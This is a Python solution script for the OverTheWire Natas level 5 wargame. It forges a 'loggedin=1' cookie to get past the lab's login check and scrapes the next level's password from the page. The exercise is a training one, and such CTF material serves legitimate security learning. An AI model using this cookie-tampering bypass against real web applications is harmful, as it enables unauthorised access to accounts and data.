import re
import requests
from halo import Halo


def get_natas6_password(natas5_password):
    URL = "http://natas5.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 6 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas5", natas5_password)
    cookies = {"loggedin": "1"}
    request = session.get(URL, cookies=cookies)
    natas6_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]

    spinner.succeed(text="The password for natas 6 is: " + natas6_password)

    return natas6_password


if __name__ == '__main__':
    natas5_password = ""  # Put here the password for natas5 here
    get_natas6_password(natas5_password)
